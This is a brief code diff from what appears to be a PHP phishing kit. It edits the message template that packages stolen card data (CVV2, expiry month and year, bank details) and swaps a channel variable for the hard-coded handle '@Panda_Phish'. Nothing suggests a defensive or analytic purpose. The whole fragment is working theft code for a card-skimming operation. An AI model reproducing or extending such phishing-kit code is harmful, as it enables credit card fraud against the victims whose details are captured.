@@ -45,7 +45,7 @@ $Text = "
 🔆Cvv2: <code>$cvv</code>
 📅Year: <code>$year</code>  Month: <code>$month</code>
 
-⚡️:@$chanel
+Channel : @Panda_Phish
 $bankinfo[0]";
 
 
